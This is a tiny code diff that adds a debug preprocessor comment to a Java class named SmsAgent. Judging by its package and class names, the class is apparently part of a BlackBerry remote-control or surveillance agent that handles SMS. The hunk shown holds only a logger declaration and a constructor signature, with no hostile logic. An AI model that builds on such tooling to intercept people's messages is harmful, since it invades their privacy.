@@ -4,6 +4,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class SmsAgent extends Agent {
+	//#debug
     static Debug debug = new Debug("SmsAgent", DebugLevel.VERBOSE);
 
     public SmsAgent(boolean agentStatus) {
